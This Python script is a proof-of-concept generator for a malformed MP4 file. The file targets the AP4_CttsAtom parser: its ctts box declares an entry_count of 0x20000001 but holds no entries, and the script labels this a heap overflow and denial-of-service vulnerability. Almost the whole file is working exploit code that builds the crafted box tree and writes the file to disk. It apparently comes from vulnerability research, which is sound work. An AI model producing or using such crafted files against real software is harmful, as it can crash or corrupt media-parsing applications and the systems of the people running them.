#!/usr/bin/env python3
"""
PoC generator for VULN 001: AP4_CttsAtom entry_count unbounded heap overflow / DoS
Generates a malicious MP4 file with ctts box entry_count=0x20000001 but no actual entries.
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "vuln_001.mp4")


def box(box_type, payload):
    """Build a box: 4-byte size + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type.encode()) + payload


def fullbox(box_type, version, flags, payload):
    """Build a fullbox: size + type + version(1) + flags(3) + payload."""
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)


# --- ftyp ---
ftyp_payload = (
    b"isom"          # major brand
    + struct.pack(">I", 0x200)  # minor version
    + b"isom" + b"iso2" + b"mp41"  # compatible brands
)
ftyp = box("ftyp", ftyp_payload)

# --- mvhd (version 0) ---
mvhd_payload = (
    struct.pack(">I", 0)        # creation time
    + struct.pack(">I", 0)      # modification time
    + struct.pack(">I", 1000)   # timescale
    + struct.pack(">I", 0)      # duration
    + struct.pack(">I", 0x00010000)  # rate (1.0)
    + struct.pack(">H", 0x0100)      # volume (1.0)
    + b"\x00" * 10              # reserved
    + struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
    + b"\x00" * 24              # pre-defined
    + struct.pack(">I", 2)      # next track ID
)
mvhd = fullbox("mvhd", 0, 0, mvhd_payload)

# --- tkhd (version 0) ---
tkhd_payload = (
    struct.pack(">I", 0)        # creation time
    + struct.pack(">I", 0)      # modification time
    + struct.pack(">I", 1)      # track ID
    + struct.pack(">I", 0)      # reserved
    + struct.pack(">I", 0)      # duration
    + b"\x00" * 8               # reserved
    + struct.pack(">H", 0)      # layer
    + struct.pack(">H", 1)      # alternate group
    + struct.pack(">H", 0x0100) # volume
    + struct.pack(">H", 0)      # reserved
    + struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
    + struct.pack(">I", 0)      # width
    + struct.pack(">I", 0)      # height
)
tkhd = fullbox("tkhd", 0, 0x000003, tkhd_payload)  # flags=3 (enabled, in movie)

# --- mdhd (version 0) ---
mdhd_payload = (
    struct.pack(">I", 0)        # creation time
    + struct.pack(">I", 0)      # modification time
    + struct.pack(">I", 44100)  # timescale
    + struct.pack(">I", 0)      # duration
    + struct.pack(">H", 0x55C4) # language (und)
    + struct.pack(">H", 0)      # pre-defined
)
mdhd = fullbox("mdhd", 0, 0, mdhd_payload)

# --- hdlr ---
hdlr_payload = (
    struct.pack(">I", 0)        # pre-defined
    + b"soun"                   # handler type
    + b"\x00" * 12              # reserved
    + b"SoundHandler\x00"       # name
)
hdlr = fullbox("hdlr", 0, 0, hdlr_payload)

# --- smhd ---
smhd_payload = struct.pack(">H", 0) + struct.pack(">H", 0)  # balance + reserved
smhd = fullbox("smhd", 0, 0, smhd_payload)

# --- dref with url entry ---
url_entry = fullbox("url ", 0, 0x000001, b"")  # self-contained flag
dref_payload = struct.pack(">I", 1) + url_entry  # entry count=1
dref = fullbox("dref", 0, 0, dref_payload)
dinf = box("dinf", dref)

# --- stsd ---
mp4a_payload = (
    b"\x00" * 6                 # reserved
    + struct.pack(">H", 1)      # data reference index
    + b"\x00" * 8               # reserved
    + struct.pack(">H", 2)      # channel count
    + struct.pack(">H", 16)     # sample size
    + struct.pack(">H", 0)      # pre-defined
    + struct.pack(">H", 0)      # reserved
    + struct.pack(">I", 44100 << 16)  # sample rate (fixed point)
)
mp4a = box("mp4a", mp4a_payload)
stsd_payload = struct.pack(">I", 1) + mp4a  # entry count=1
stsd = fullbox("stsd", 0, 0, stsd_payload)

# --- stts (1 entry: sample_count=1, sample_delta=1) ---
stts_payload = (
    struct.pack(">I", 1)        # entry count
    + struct.pack(">I", 1)      # sample count
    + struct.pack(">I", 1)      # sample delta
)
stts = fullbox("stts", 0, 0, stts_payload)

# --- MALICIOUS ctts ---
# entry_count = 0x20000001 but NO actual entry data follows
# box = 4(size) + 4(type) + 1(version) + 3(flags) + 4(entry_count) = 16 bytes total
MALICIOUS_ENTRY_COUNT = 0x20000001
ctts_inner = struct.pack(">I", MALICIOUS_ENTRY_COUNT)  # entry_count only, no entries
ctts = fullbox("ctts", 0, 0, ctts_inner)

# --- stsz (0 samples) ---
stsz_payload = (
    struct.pack(">I", 0)        # sample size (0 = variable)
    + struct.pack(">I", 0)      # sample count
)
stsz = fullbox("stsz", 0, 0, stsz_payload)

# --- stco (0 entries) ---
stco_payload = struct.pack(">I", 0)  # entry count
stco = fullbox("stco", 0, 0, stco_payload)

# --- stbl ---
stbl = box("stbl", stsd + stts + ctts + stsz + stco)

# --- minf ---
minf = box("minf", smhd + dinf + stbl)

# --- mdia ---
mdia = box("mdia", mdhd + hdlr + minf)

# --- trak ---
trak = box("trak", tkhd + mdia)

# --- moov ---
moov = box("moov", mvhd + trak)

# --- Final MP4 ---
mp4_data = ftyp + moov

with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
print(f"[+] ctts entry_count = 0x{MALICIOUS_ENTRY_COUNT:08X} ({MALICIOUS_ENTRY_COUNT})")
print(f"[+] ctts box size = {len(ctts)} bytes (no actual entries)")
